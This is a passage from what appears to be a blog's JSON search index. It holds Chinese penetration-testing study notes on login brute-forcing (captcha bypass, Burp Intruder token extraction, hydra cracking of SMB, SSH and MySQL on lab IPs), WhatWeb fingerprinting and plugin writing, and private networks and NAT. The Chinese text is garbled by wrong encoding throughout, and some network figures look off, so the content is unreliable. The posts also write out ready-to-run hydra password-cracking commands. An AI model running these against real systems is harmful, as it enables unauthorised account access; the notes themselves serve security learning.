#ä»‹ç»è‡ªå·±è¿™ä¸ªé¡¹ç›®çš„ï¼Œå¯å‚ç…§githubä¸Šstarå¤šçš„é¡¹ç›®ã€‚build&#x2F;","categories":[{"name":"å‰ç«¯","slug":"å‰ç«¯","permalink":"https://zhangyanlady.github.io/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"å‰ç«¯","slug":"å‰ç«¯","permalink":"https://zhangyanlady.github.io/tags/%E5%89%8D%E7%AB%AF/"},{"name":"vue","slug":"vue","permalink":"https://zhangyanlady.github.io/tags/vue/"}],"keywords":[{"name":"å‰ç«¯","slug":"å‰ç«¯","permalink":"https://zhangyanlady.github.io/categories/%E5%89%8D%E7%AB%AF/"}]},{"title":"æš´åŠ›ç ´è§£","slug":"æš´åŠ›ç ´è§£","date":"2020-09-12T12:06:48.000Z","updated":"2020-09-19T09:52:26.574Z","comments":true,"path":"2020/09/12/æš´åŠ›ç ´è§£/","link":"","permalink":"https://zhangyanlady.github.io/2020/09/12/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/","excerpt":"","text":"æ€»ç»“å›¾ ä¸€ä¸ªç½‘ç«™ç™»å½•çš„åœ°æ–¹æœ‰é‚£äº›æ¼æ´ï¼Œç”¨è‡ªå·±çš„è¯­è¨€åšä¸€ä¸ªæ€»ç»“ã€‚1ã€ ç”¨æˆ·æ˜¯å¦è®¾ç½®äº†å¤æ‚çš„å¯†ç  2ã€ç½‘ç«™æ˜¯å¦å­˜åœ¨éªŒè¯ç  3ã€ ç½‘ç«™å°è¯•ç™»å½•çš„è¡Œä¸ºæ˜¯å¦æœ‰é™åˆ¶ 4ã€ ç½‘ç«™æ˜¯å¦åŒå› ç´ è®¤è¯ï¼ˆä¸€èˆ¬åœ¨ç®¡ç†åå°ç™»é™†ä½¿ç”¨ï¼‰ 5ã€ ç½‘ç«™æ˜¯å¦è®¾ç½®äº†Tokenå€¼ 6ã€æç¤ºç”¨æˆ·åé”™è¯¯æˆ–è€…æç¤ºå¯†ç é”™è¯¯ä¼šæ³„éœ²ä¿¡æ¯ï¼ˆçœŸç¡®çš„åº”è¯¥ä¸ºæç¤ºç”¨æˆ·åæˆ–å¯†ç é”™è¯¯ï¼‰ 7ã€æ³¨å†Œè´¦å·æ—¶å¯ä»¥æ‰¹é‡æ³¨å†Œè´¦å· 8ã€ ä¿®æ”¹å¯†ç æ—¶ä¸éœ€è¦æä¾›æ—§å¯†ç  9ã€æ³¨å†Œç”¨æˆ·æ—¶ä¸å­˜åœ¨å”¯ä¸€æ€§å¯ä»¥æ³¨å†Œå¤šä¸ªåŒåè´¦å· 10ã€ å¯†ç æœªåŠ å¯†æ˜æ–‡ä¼ è¾“ 11ã€ æºä»£ç æ¡†æ¶å­˜åœ¨å¯†ç  C/Sä¸B/Sçš„ç»“æ„åŒºåˆ«ï¼š ç¡¬ä»¶ç¯å¢ƒä¸åŒï¼ŒC/Sé€šå¸¸æ˜¯å»ºç«‹åœ¨ä¸“ç”¨çš„ç½‘ç»œä¸Šï¼Œå°èŒƒå›´çš„ç½‘ç»œç¯å¢ƒã€‚è€ŒB/Sæ˜¯å»ºç«‹åœ¨å¹¿åŸŸç½‘ä¸Šçš„ï¼Œé€‚åº”èŒƒå›´å¼ºï¼Œé€šå¸¸æœ‰æ“ä½œç³»ç»Ÿå’Œæµè§ˆå™¨å°±è¡Œï¼› å®‰å…¨è¦æ±‚ä¸åŒï¼ŒC/Sç»“æ„æ¯”B/Sç»“æ„æ›´å®‰å…¨ï¼Œå› ä¸ºç”¨æˆ·ç¾¤ç›¸å¯¹å›ºå®šï¼Œå¯¹ä¿¡æ¯çš„ä¿æŠ¤æ›´å¼ºï¼›è€ŒB/Sç»“æ„é¢å‘çš„èŒƒå›´å¹¿ï¼Œæ‰€ä»¥å®‰å…¨æ€§æ¯”è¾ƒä½ï¼› ç³»ç»Ÿç»´æŠ¤ä¸åŒï¼ŒB/Sç»“æ„ç»´æŠ¤å‡çº§æ¯”è¾ƒç®€å•ï¼Œè€ŒC/Sç»“æ„ç»´æŠ¤å‡çº§ç›¸å¯¹å›°éš¾ã€‚ ï¼ˆb/sï¼‰ï¼ˆæµè§ˆå™¨/å®¢æˆ·ç«¯ï¼‰éªŒè¯ç æš´åŠ›ç ´è§£ï¼ˆon clientã€on serverã€Tokenï¼‰å®éªŒon server:æˆ‘ä»¬å¯ä»¥çœ‹è§å½“æˆ‘ä»¬è¾“å…¥é”™è¯¯çš„éªŒè¯ç æ—¶éªŒè¯ç è¾“å…¥é”™è¯¯ on serverå¸¸è§é—®é¢˜ï¼šéªŒè¯ç åœ¨åå°ä¸è¿‡æœŸï¼Œå¯¼è‡´é•¿æœŸä½¿ç”¨(phpé»˜è®¤sessionæ˜¯24åˆ†é’Ÿè¿‡æœŸ)ï¼›éªŒè¯ç æ ¡éªŒä¸ä¸¥æ ¼ï¼Œé€»è¾‘å‡ºç°é—®é¢˜ï¼›éªŒè¯ç è®¾è®¡çš„å¤ªè¿‡ç®€å•å’Œæœ‰è§„å¾‹çš„è¢«çŒœè§£ å½“æˆ‘ä»¬æ­£ç¡®çš„æ—¶å€™æç¤ºæˆ‘ä»¬è´¦å·æˆ–å¯†ç é”™è¯¯æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»çˆ†ç ´éªŒè¯ç å¹¶æ²¡æœ‰è¢«æ›¿æ¢ on clientï¼šå¸¸è§é—®é¢˜ï¼šä¸å®‰å…¨çš„å‰ç«¯jså®ç°éªŒè¯ç ï¼›ä¸å®‰å…¨çš„å°†éªŒè¯ç åœ¨cookieä¸­æ³„éœ²ï¼›ä¸å®‰å…¨çš„å°†éªŒè¯ç åœ¨å‰ç«¯æºä»£ç ä¸­æ³„éœ² æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æŠ“åŒ…è¾“å…¥é”™è¯¯çš„éªŒè¯ç å¹¶æ²¡æœ‰æç¤ºéªŒè¯ç é”™è¯¯è€Œæç¤ºç”¨æˆ·åæˆ–å¯†ç é”™è¯¯å› ä¸ºè¿™æ˜¯å®¢æˆ·ç«¯éªŒè¯åªæ˜¯æ¬ºéª—å‰ç«¯æˆ‘ä»¬å¯ä»¥ç›´æ¥æŠŠéªŒè¯ç å»æ‰è¿›è¡Œçˆ†ç ´ Tokenï¼šç”±äºtokenå€¼è¾“å‡ºåœ¨å‰ç«¯æºä»£ç ä¸­ï¼Œå®¹æ˜“è¢«è·å–ï¼Œå› æ­¤ä¹Ÿå°±å¤±å»äº†é˜²æš´åŠ›ç ´è§£çš„æ„ä¹‰ï¼Œä¸€èˆ¬Tokenåœ¨é˜²æ­¢CSRFä¸Šä¼šæœ‰æ¯”è¾ƒå¥½çš„åŠŸéƒŠã€‚ æˆ‘ä»¬ä½¿ç”¨éŸ³å‰æ”»å‡»æ³¨æ„ï¼šçº¿ç¨‹æ•°è®¾ä¸º1ï¼›Grep-Extractè®¾ç½®å¥½å¼€å§‹tokenâ€value=â€ ç»“æŸä¸ºâ€ /&gt; ï¼›æœ‰éƒŠè½½è·è®¾ä¸ºé€’å½’æœç´¢ â€œtokenâ€ value=â€ éªŒè¯ç è¯†åˆ«å®éªŒå› ä¸ºæˆ‘ä»¬çš„ä½¿ç”¨å·¥å…·è¿˜ä¸èƒ½æŠ“åŒ…æ‰€ä»¥ 1.BurpæŠ“åŒ…ï¼Œç„¶åå¤åˆ¶URLã€æ•°æ®åŒ…åˆ°Pkavã€‚ \\2. è®¾ç½®å¯†ç æ ‡è®°ã€éªŒè¯ç æ ‡è®°ã€é…ç½®ã€åŠ è½½å¤–éƒ¨å­—å…¸ã€é…ç½®éªŒè¯ç ã€å‘åŒ…ã€‚ Bruterã€hydraå¯¹smbã€sshã€mysqlç­‰è¿›è¡Œå¯†ç æš´ç ´Bruter(ä½¿ç”¨å­—å…¸æ—¶ä¸èƒ½æœ‰ä¸­æ–‡ç›®å½•) Bruterå¯¹mysqlç ´è§£ Bruterå¯¹mysqlç ´è§£ï¼šï¼ˆmysqlä¸èƒ½ä½¿ç”¨ipåœ°å€è¿æ¥ï¼‰æ‰€ä»¥æˆ‘è¿™é‡Œç”¨æœ¬åœ°è¿æ¥ Bruterå¯¹sshç ´è§£ hydraå¯¹smbã€sshã€mysqlç ´è§£å¯¹smbç ´è§£ï¼š# hydra -l administrator -P top100.txt 192.168.0.102 smb å¯¹sshç ´è§£1.ç ´è§£sshï¼š# hydra -l ç”¨æˆ·å -p å¯†ç å­—å…¸ -t çº¿ç¨‹-vV -e ns ip ssh # hydra -l ç”¨æˆ·å -p å¯†ç å­—å…¸ -t çº¿ç¨‹-o save.log -vV ip ssh root@kali:~# hydra -L user.txt -P top100.txt -t 1 -vV -e ns -o save.log 192.168.0.109 ssh å¯¹mysqlç ´è§£root@kali:~# hydra -L user.txt -P top100.txt -t 2 -vV -e ns -o save.log 192.168.0.113 mysql æš´åŠ›ç ´è§£åŠéªŒè¯ç å®‰å…¨é˜²èŒƒ\\1. å¯†ç é•¿åº¦8ä½åŠä»¥ä¸Šã€‚ ä¸å…è®¸ä»¥è‡ªå·±çš„æ‰‹æœºå·ç ã€QQã€é‚®ç®±ç­‰å…³é”®â€œç‰¹å¾â€ä¸ºå¯†ç ã€‚ ç”¨æˆ·åä¸å¯†ç ä¸èƒ½æœ‰ä»»ä½•è”ç³»ï¼Œå¦‚ç”¨æˆ·åä¸ºâ€œadminâ€ï¼Œå¯†ç ä¸ºâ€œadmin888â€ã€‚ \\4. å¯†ç å¯†ç å¤æ‚åº¦è¦æ±‚ï¼šå­—ç¬¦ã€å¤§å°å†™ã€æ•°å­—ç­‰ã€‚ \\5. è®¾ç½®éªŒè¯ç è¿‡æœŸæ—¶é—´ã€ä½¿ç”¨äº†é©¬ä¸Šå¤±æ•ˆç­‰ï¼ŒåŠ å¤§éªŒè¯ç å¤æ‚åº¦ï¼šé¢œè‰²å¹²æ‰°ã€ç¬¦å·å¹²æ‰°ç­‰ã€‚ æœ‰æ—¶é—´çš„åŒå­¦çœ‹ä¸€ä¸‹http://drops.leesec.com/#!/drops/525.%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB çœ‹ä¸€ä¸‹éªŒè¯ç æ€»ç»“æ–‡ç« ï¼Œå¯ä»¥ç»“åˆè¿™ä¸ªç«™http://wooyun.2xss.cc/ æŸ¥çœ‹æ”»å‡»è¿‡ç¨‹","categories":[],"tags":[],"keywords":[]},{"title":"WhatWebä½¿ç”¨","slug":"WhatWebä½¿ç”¨","date":"2020-09-10T13:00:35.000Z","updated":"2020-09-20T09:05:09.934Z","comments":true,"path":"2020/09/10/WhatWebä½¿ç”¨/","link":"","permalink":"https://zhangyanlady.github.io/2020/09/10/WhatWeb%E4%BD%BF%E7%94%A8/","excerpt":"","text":"ç®€ä»‹WhatWebæ˜¯ä¸€ä¸ªå¼€æºçš„ç½‘ç«™æŒ‡çº¹è¯†åˆ«è½¯ä»¶ã€‚ WhatWebå¯è¯†åˆ«WebæŠ€æœ¯ï¼ŒåŒ…æ‹¬å†…å®¹ç®¡ç†ç³»ç»Ÿï¼ˆCMSï¼‰ï¼Œåšå®¢å¹³å°ï¼Œç»Ÿè®¡/åˆ†æåŒ…ï¼ŒJavascriptåº“ï¼ŒæœåŠ¡å™¨å’ŒåµŒå…¥å¼è®¾å¤‡ã€‚ WhatWebæœ‰è¶…è¿‡1000ä¸ªæ’ä»¶ï¼Œæ¯ä¸ªæ’ä»¶éƒ½èƒ½è¯†åˆ«ä¸åŒçš„ä¸œè¥¿ã€‚WhatWebè¿˜æ ‡è¯†ç‰ˆæœ¬å·ï¼Œç”µå­é‚®ä»¶åœ°å€ï¼Œè´¦æˆ·IDï¼ŒWebæ¡†æ¶æ¨¡å—ï¼ŒSQLé”™è¯¯ç­‰ã€‚ ç‰¹æ€§æ‹¥æœ‰è¶…è¿‡1700+ä¸ªæ’ä»¶ â€‹ è‹¥ç½‘ç«™è¿”å›302ï¼Œä¼šè·³è½¬åˆ°é‡å®šå‘çš„ç½‘ç«™ â€‹ å¯ä»¥æ ¹æ®æœåŠ¡å™¨è¿”å›çš„å“åº”å¤´ç¡®å®šç½‘ç«™ä½¿ç”¨çš„æœåŠ¡å™¨ç±»å‹ï¼Œwebä¸­é—´ä»¶ç±»å‹ï¼Œcookieä¿¡æ¯ â€‹ å¯ä»¥ä»ç½‘ç«™çš„æºä»£ç ä¸­ç¡®å®šç½‘ç«™ä½¿ç”¨äº†å“ªäº›JavaScriptåº“ â€‹ å¯ä»¥é€šè¿‡é¡µé¢hashï¼Œpathç­‰ç¡®å®šç½‘ç«™ä½¿ç”¨çš„cmsç‰ˆæœ¬ â€‹ æŸ¥è¯¢ç½‘ç«™ipåŠæ‰€å±å›½å®¶ â€‹ å¤šç§æ—¥å¿—æ ¼å¼ï¼šXMLï¼ŒJSONï¼ŒMagicTreeï¼ŒRubyObjectï¼ŒMongoDB â€‹ å¯å®šåˆ¶åŒ–HTTPå¤´ â€‹ å¯è¿›è¡ŒåŸºç¡€çš„è®¤è¯è®¾ç½® â€‹ æ”¯æŒæ‰¹é‡æ‰«æç½‘ç«™ å®‰è£…Whatwebæ˜¯åŸºäºrubyè¯­è¨€å¼€å‘ï¼Œå› æ­¤å¯ä»¥å®‰è£…åœ¨å…·å¤‡rubyç¯å¢ƒçš„ç³»ç»Ÿä¸­ï¼Œç›®å‰æ”¯æŒWindows/Max OSX/Linuxã€‚ æ³¨ï¼škali linuxä¸‹å·²ç»é›†æˆäº†æ­¤å·¥å…· debian/ubtuntuç³»ç»Ÿä¸‹ apt-get install whatweb //å¯è‡ªåŠ¨è§£å†³ä»¥æ¥é—®é¢˜ redhat/centosç³»ç»Ÿä¸‹ yum updateyum install ruby ruby-devel rubygemswget http://www.morningstarsecurity.com/downloads/whatweb-0.4.7.tar.gztar xzvf whatweb-0.4.7.tar.gzcd whatweb-0.4.7./whatweb url ä½¿ç”¨ç”¨æ³•ï¼šwhatweb åŸŸå -i æŒ‡å®šè¦æ‰«æçš„æ–‡ä»¶ -v è¯¦ç»†æ˜¾ç¤ºæ‰«æçš„ç»“æœ -a æŒ‡å®šè¿è¡Œçº§åˆ« å¸¸è§„æ‰«æ whatweb åŸŸå æ‰¹é‡æ‰«æ æˆ‘ä»¬å¯ä»¥é€šè¿‡å°†å¾ˆå¤šè¦æ‰«æçš„åŸŸåæ”¾åœ¨æ–‡ä»¶å†…ï¼Œç„¶åæ‰«ææ—¶æŒ‡å®šè¯¥æ–‡ä»¶å³å¯ã€‚ ä½¿ç”¨å‘½ä»¤ï¼šwhatweb -i /root/target.txt è¯¦ç»†å›æ˜¾æ‰«æ whatweb -v åŸŸå å¼ºåº¦æ‰«æç­‰çº§æ§åˆ¶ whatwebæœ‰ä¸€ä¸ª-aggressionï¼ˆç®€å†™ä¸º-aï¼‰å‚æ•°ï¼Œæ­¤å‚æ•°åè¾¹å¯ä»¥è·Ÿæ•°å­—1-4ï¼Œåˆ†åˆ«å¯¹åº”4ä¸ªä¸åŒçš„ç­‰çº§ã€‚ stealthy æ¯ä¸ªç›®æ ‡å‘é€ä¸€æ¬¡httpè¯·æ±‚ï¼Œå¹¶ä¸”ä¼šè·Ÿéšé‡å®šå‘ â€‹ unused ä¸å¯ç”¨ï¼ˆä»2011å¹´å¼€å§‹ï¼Œæ­¤å‚æ•°å°±æ˜¯åœ¨å¼€å‘çŠ¶æ€ â€‹ aggressive æ¯ä¸ªç›®æ ‡å‘é€å°‘é‡çš„httpè¯·æ±‚ï¼Œè¿™äº›è¯·æ±‚æ—¶æ ¹æ®å‚æ•°ä¸º1æ—¶ç»“æœç¡®å®šçš„ â€‹ heavy æ¯ä¸ªç›®æ ‡ä¼šå‘é€å¤§é‡çš„httpè¯·æ±‚ï¼Œä¼šå»å°è¯•æ¯ä¸€ä¸ªæ’ä»¶ whatweb -a ç­‰çº§ åŸŸå ï¼ˆå¯ä»¥å’Œ-vå‚æ•°ç»“åˆä½¿ç”¨ æ³¨ï¼šé»˜è®¤å‚æ•°ä¸º1 å¿«é€Ÿæœ¬åœ°æ‰«æï¼ˆæ‰«æå†…ç½‘ä¸»æœºï¼‰ whatweb â€“no-errors -t 255 å†…ç½‘ç½‘æ®µ ï¼ˆå¯ä»¥å’Œ-aå’Œ-vå‚æ•°ç»“åˆä½¿ç”¨ å°†æ‰«æç»“æœå¯¼å‡ºè‡³æ–‡ä»¶å†… whatweb www.baidu.com â€“log-xml=baidu.xml å…¶ä»–æ ¼å¼å¯¼å‡ºæ–‡ä»¶åŒç†ï¼š â€“log-brief=FILE ç®€å•çš„è®°å½•ï¼Œæ¯ä¸ªç½‘ç«™åªè®°å½•ä¸€æ¡è¿”å›ä¿¡æ¯â€“log-verbose=FILE è¯¦ç»†è¾“å‡ºâ€“log-xml=FILE è¿”å›xmlæ ¼å¼çš„æ—¥å¿—â€“log-json=FILE ä»¥jsonæ ¼å¼è®°å½•æ—¥å¿—â€“log-json-verbose=FILE è®°å½•è¯¦ç»†çš„jsonæ—¥å¿—â€“log-magictree=FILE xmlçš„æ ‘å½¢ç»“æ„â€“log-object=FILE rubyå¯¹è±¡æ ¼å¼â€“log-mongo-database mongoæ•°æ®åº“æ ¼å¼ æ³¨ï¼šjsonæ ¼å¼éœ€è¦å®‰è£…jsonä¾èµ–sudo gem install json Mongoæ ¼å¼éœ€è¦å®‰è£…mongoä¾èµ–sudo gem install json åˆ—å‡ºæ‰€æœ‰æ’ä»¶ whatweb -l æŸ¥çœ‹æ’ä»¶çš„å…·ä½“ä¿¡æ¯ whatweb â€“info-plugins=â€æ’ä»¶åâ€ æ’ä»¶çš„å¼€å‘è¯­è¨€ä¸ºrubyï¼Œæ‰€ä»¥æ’ä»¶ä¸º.rbæ ¼å¼ï¼Œæ’ä»¶çš„ä¿å­˜ç›®å½•ä¸º/usr/share/whatweb/pluginsï¼Œå¯ä»¥æŸ¥çœ‹åˆ«äººæ˜¯æ€ä¹ˆå†™æ’ä»¶çš„ã€‚ ç¼–å†™whatwebæ’ä»¶ whatwebå¯¹å›½å†…çš„ç½‘ç«™è¯†åˆ«ä¸æ˜¯å¾ˆå‹å¥½ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå·±å†™æ’ä»¶ï¼Œå…¼å®¹æ›´å¤šå›½å†…çš„ç½‘ç«™ã€‚ whatwebçš„å®˜æ–¹æ¨¡æ¿ï¼š Plugin.define â€œPlugin-Templateâ€ do author â€œEnter Your Nameâ€ version â€œ0.1â€ description â€œDescribe what the plugin identifies. Include the homepage of the software packageâ€ examples %w| include-some.net example-websites.com here.com | # a comment block here is a good place to make notes for yourself and others # There are four types of matches: regexp, text, ghdb # Matches are enclosed in {} brackets and separated by commas matches [ {:name=&gt;â€a brief description of the match, eg. powered by in footerâ€, :certainty=&gt;100, # 100 is certain, 75 is probably and 25 is maybe. if omitted, it defaults to 100. :regexp=&gt;/This page was generated by http://www.genericcms.com\\/en\\/products\\/generic-cms\\/&quot;&gt;Generic CMS&lt;/a&gt;/ }, {:name=&gt;â€titleâ€, :certainty=&gt;75, :text=&gt;â€Generic Homepageâ€œ } ] end è¯­æ³•è§£é‡Šï¼š ç¬¬ä¸€è¡Œå®šä¹‰çš„ä¸ºæ’ä»¶çš„åå­—ï¼Œå¯ä»¥ç›´æ¥åœ¨å‘½ä»¤è¡Œä¸­ä½¿ç”¨ã€‚ å‘½ä»¤è¡Œæµ‹è¯•ï¼š ./whatweb -p drupal www.example.com ç¬¬äºŒè¡Œä½œè€…ï¼Œç¬¬ä¸‰è¡Œç‰ˆæœ¬ï¼Œç¬¬å››è¡Œæ’ä»¶æè¿°ï¼Œç¬¬äº”è¡Œï¼Œæ’ä»¶æ‰€ä½¿ç”¨ç½‘ç«™çš„ä¾‹å­ ç¬¬äº”è¡Œæ˜¯ä¸€ä¸ªmatchsåˆ—è¡¨ï¼Œä¹Ÿæ˜¯whatwebçš„å…³é”®ï¼Œé‡Œè¾¹å®šä¹‰äº†ä¸€äº›åŒ¹é…è§„åˆ™ {:name=&gt;â€meta generator tagâ€, : åŒ…å«åŒ¹é…çš„æ–‡ä»¶åç§°ï¼Œè¿™ä¸ªæ–‡ä»¶å¿…é¡»æ˜¯ç½‘ç«™ä¸­å”¯ä¸€å­˜åœ¨çš„æ–‡ä»¶ã€‚ :regexp=&gt; æ˜¯åŒ…å«çš„è¦åŒ¹é…çš„æ¨¡å¼ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œå¯ä»¥æœ‰ä»¥ä¸‹é€‰é¡¹ï¼š :regexpæ ‡å‡†çš„ ruby æ­£åˆ™è¡¨è¾¾å¼:text å­—ç¬¦:ghdb google hack æ•°æ®åº“ï¼ŒåŒ…å«ä»¥ä¸‹å‡ ä¸ªæ¨¡å¼inurl:åŒ…å«çš„å­—ç¬¦ä¸²åœ¨ urlintitle:åŒ…å«çš„å­—ç¬¦ä¸²åœ¨ titlefiletype:åŒ…å«çš„æ–‡ä»¶åï¼Œå¦‚ PDF, JPG, RB ç­‰:md5 è¯·æ±‚é¡µé¢çš„ md5 hash å€¼:tagpattern html æ ‡ç­¾:version å¯ä»¥è®¾ç½®æ­£åˆ™è¡¨è¾¾å¼æˆ–ç›´æ¥å­—ç¬¦ä¸²åŒ¹é…:string å¯ä»¥è®¾ç½®æ­£åˆ™è¡¨è¾¾å¼æˆ–ç›´æ¥å­—ç¬¦ä¸²åŒ¹é…:filepath å¯ä»¥è®¾ç½®æ­£åˆ™è¡¨è¾¾å¼æˆ–ç›´æ¥å­—ç¬¦ä¸²åŒ¹é…ï¼Œé€šå¸¸æ˜¾ç¤ºç³»ç»Ÿé”™è¯¯æˆ–é…ç½®æ–‡ä»¶ç­‰:account ç»å¸¸ç”¨åœ¨ç™»é™†é¡µé¢æˆ–ç”¨æˆ·åˆ—è¡¨ç­‰:module å¯ä»¥è®¾ç½®æ­£åˆ™è¡¨è¾¾å¼æˆ–ç›´æ¥å­—ç¬¦ä¸²åŒ¹é…ï¼Œå¦‚ç½‘ç»œè®¾å¤‡å¯èƒ½ä½¿ç”¨äº†ä¸€ä¸ªruby æ¨¡å—ç­‰:model å¯ä»¥è®¾ç½®æ­£åˆ™è¡¨è¾¾å¼æˆ–ç›´æ¥å­—ç¬¦ä¸²åŒ¹é…:firmware å¯ä»¥è®¾ç½®æ­£åˆ™è¡¨è¾¾å¼æˆ–ç›´æ¥å­—ç¬¦ä¸²åŒ¹é…ï¼Œè®¾å¤‡çš„å›ºä»¶ç‰ˆæœ¬ äº†è§£ä»¥ä¸Šé€‰é¡¹æˆ‘ä»¬å¯ä»¥å†™å‡ºä¸€ä¸ªç®€å•çš„è¯†åˆ«dedecmsçš„æ’ä»¶ï¼Œå¦‚ä¸‹ Plugin.define â€œDedeCMSâ€ doauthor â€œxxxxxâ€version â€œ0.1â€description â€œdedecms - homepage:http://www.dedecms.com/&quot; # Examples # examples %w|www.dedecms.com| matches [ # Version detection # Powered by text {:name=&gt;â€Powered by DedeCmsâ€,:regexp=&gt;/Powered by .DedeCMS./}]end","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"å†…ç½‘æ¸—é€","slug":"å†…ç½‘æ¸—é€","date":"2020-08-16T15:06:21.000Z","updated":"2020-09-20T08:56:22.549Z","comments":true,"path":"2020/08/16/å†…ç½‘æ¸—é€/","link":"","permalink":"https://zhangyanlady.github.io/2020/08/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/","excerpt":"","text":"æ€»ç»“å›¾ å†…ç½‘æ¦‚è¿°å†…ç½‘IPæ˜¯ä»¥ä¸‹é¢å‡ ä¸ªæ®µbaiå¼€å¤´çš„IP.ç”¨æˆ·å¯ä»¥è‡ªå·±è®¾ç½®du.å¸¸ç”¨çš„zhiå†…ç½‘IPåœ°å€: 10.x.x.x 172.16.x.xè‡³172.31.x.x 192.168.x.x å†…ç½‘çš„è®¡ç®—æœºä»¥NATï¼ˆç½‘ç»œåœ°å€è½¬æ¢ï¼‰åè®®ï¼Œé€šè¿‡ä¸€ä¸ªå…¬å…±çš„ç½‘å…³è®¿é—®Internetã€‚å†…ç½‘çš„è®¡ç®—æœºå¯å‘Internetä¸Šçš„å…¶ä»–è®¡ç®—æœºå‘é€è¿æ¥è¯·æ±‚ï¼Œä½†Internetä¸Šå…¶ä»–çš„è®¡ç®—æœºæ— æ³•å‘å†…ç½‘çš„è®¡ç®—æœºå‘é€è¿æ¥è¯·æ±‚ã€‚ NATï¼ˆNetwork Address Translatorï¼‰æ˜¯ç½‘ç»œåœ°å€è½¬æ¢ï¼Œå®ƒå®ç°å†…ç½‘çš„IPåœ°å€ä¸å…¬ç½‘çš„åœ°å€ä¹‹é—´çš„ç›¸äº’è½¬æ¢ï¼Œå°†å¤§é‡çš„å†…ç½‘IPåœ°å€è½¬æ¢ä¸ºä¸€ä¸ªæˆ–å°‘é‡çš„å…¬ç½‘IPåœ°å€ï¼Œå‡å°‘å¯¹å…¬ç½‘IPåœ°å€çš„å ç”¨ã€‚NATçš„æœ€å…¸å‹åº”ç”¨æ˜¯ï¼šåœ¨ä¸€ä¸ªå±€åŸŸç½‘å†…ï¼Œåªéœ€è¦ä¸€å°è®¡ç®—æœºè¿æ¥ä¸ŠInternetï¼Œå°±å¯ä»¥åˆ©ç”¨NATå…±äº«Internetè¿æ¥ï¼Œä½¿å±€åŸŸç½‘å†…å…¶ä»–è®¡ç®—æœºä¹Ÿå¯ä»¥ä¸Šç½‘ã€‚ä½¿ç”¨NATåè®®ï¼Œå±€åŸŸç½‘å†…çš„è®¡ç®—æœºå¯ä»¥è®¿é—®Internetä¸Šçš„è®¡ç®—æœºï¼Œä½†Internetä¸Šçš„è®¡ç®—æœºæ— æ³•è®¿é—®å±€åŸŸç½‘å†…çš„è®¡ç®—æœºã€‚ Windowsæ“ä½œç³»ç»Ÿçš„Internetè¿æ¥å…±äº«ã€sygateã€winrouteã€unix/linuxçš„natdç­‰è½¯ä»¶ï¼Œéƒ½æ˜¯ä½¿ç”¨NATåè®®æ¥å…±äº«Internetè¿æ¥ã€‚ æ‰€æœ‰ISPï¼ˆInternetæœåŠ¡æä¾›å•†ï¼‰æä¾›çš„å†…ç½‘Internetæ¥å…¥æ–¹å¼ï¼Œå‡ ä¹éƒ½æ˜¯åŸºäºNATåè®®çš„ã€‚ å†…ç½‘IP è¯¦ç»†:å¤§éƒ¨åˆ†ç½‘ç»œä½¿ç”¨Bç±»æˆ–Cç±»åœ°å€ï¼Œæ¯ä¸€ä¸ªç±»çš„ç¬¬ä¸€ä¸ªå…«ä½ç»„çš„èŒƒå›´å¦‚ä¸‹ï¼š 1ã€ 0-â€”127ã€‚Aç±» ç½‘ç»œå·ç èŒƒå›´æ˜¯ 0.0.0.0â€”127.0.0.0 ,ç”¨äº128ä¸ªç½‘ç»œã€‚ä½†ç½‘ç»œä¸èƒ½å…¨ç”±0ç»„æˆä¸”127.0.0.0ä¿ç•™ç”¨äºå›è·¯ã€‚å‰©ä¸‹çš„126ä¸ªç½‘ç»œï¼Œ1åˆ°126ï¼Œå…±æœ‰16777214ä¸ªå¯èƒ½çš„ä¸»æœºåœ°å€ï¼ˆ16777216å‡2ï¼‰ Aç±» ç½‘ç»œ â€”ä¸»æœºâ€”ä¸»æœºâ€”ä¸»æœº 0-127 127 0 0 0 2ã€ 128â€”191ã€‚Bç±»ï¼Œç½‘ç»œå·ç èŒƒå›´æ˜¯128.0.0.0â€“191.254.0.0 ç”¨äº16256ä¸ªç½‘ç»œã€‚å…±æœ‰65534ä¸ªå¯èƒ½çš„ä¸»æœºåœ°å€ Bç±» ç½‘ç»œâ€”ç½‘ç»œâ€”-ä¸»æœºâ€”ä¸»æœº 128-191 128 123 0 0 3ã€ 192â€“223ã€‚Cç±»ï¼Œç½‘ç»œå·ç èŒƒå›´æ˜¯192.0.0.0â€“223.254.254.0ï¼Œç”¨äº2064512ä¸ªç½‘ç»œã€‚å…±æœ‰254ä¸ªå¯èƒ½çš„ä¸»æœºåœ°å€ Cç±» ç½‘ç»œâ€”ç½‘ç»œâ€”-ç½‘ç»œâ€”ä¸»æœº 192-223 192 0 0 0 æ‰€æœ‰çš„ç½‘ç»œç©ºé—´è®¡ç®—éƒ½å¿…é¡»â€œå‡2â€ï¼Œè¿™æ˜¯å› ä¸ºè¦æ‰£é™¤ä¸¤ä¸ªä¿ç•™åœ°å€ï¼šâ€œ0â€ä¸ºç½‘ç»œå·ï¼Œâ€œ255â€ä¸ºå¹¿æ’­ã€‚åœ°å€1-254åˆ†é…ç»™ä¸»æœºã€‚ ç¬¬ä¸€ä¸ªå…«ä½ç»„å·ç 